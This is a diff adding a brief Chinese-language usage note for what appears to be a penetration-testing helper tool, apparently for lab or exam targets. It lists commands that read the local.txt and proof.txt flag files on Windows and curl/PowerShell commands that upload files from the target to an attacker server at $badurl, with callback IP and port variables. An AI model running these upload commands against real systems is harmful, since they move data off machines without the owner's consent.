@@ -1,0 +1,18 @@
+>01 查key
+>cmd get local.txt
+type c:\users\%username%\desktop\local.txt
+>powershell get local.txt
+type C:\Users\$env:USERNAME\Desktop\local.txt
+>cmd get proof.txt
+type c:\users\administrator\desktop\proof.txt
+>cmd文件上传，依赖updog，需要自行修改文件名，默认上传到tools/windows目录下
+curl.exe -v -F "file=@file.txt;filename=file.txt" -F "path=$toolpath" $badurl/upload 
+>powershell文件上传，依赖updog，需要自行修改文件名
+iwr -Uri $badurl/upload -Method Post -Form @{file=Get-Item "file.txt";filename="file.txt";path="$toolpath"}
+
+###
+说明：
+- 这是目录级 readme.usage 示例，不绑定具体文件，适合记录无需下载工具的常用命令
+- 支持变量：$badip、$callback_ip、$callback_port
+- 若未手动设置回连参数，$callback_ip 默认等于 $badip；手动设置后两者互不影响
+###
